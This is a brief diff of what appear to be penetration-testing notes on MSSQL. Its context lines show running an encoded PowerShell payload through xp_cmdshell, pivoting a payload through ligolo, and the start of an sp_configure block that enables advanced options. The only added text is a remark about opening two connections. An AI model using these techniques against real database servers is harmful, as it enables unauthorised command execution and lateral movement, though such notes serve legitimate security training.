@@ -128,6 +128,10 @@ xp_cmdshell powershell -e [payload]
 
 [[Sending payload reverse direction through ligolo pivot]]
 
+Note : 
+
+You can open 2 connections at once
+
 ```mssql
 -- To allow advanced options to be changed.  
 EXECUTE sp_configure 'show advanced options', 1
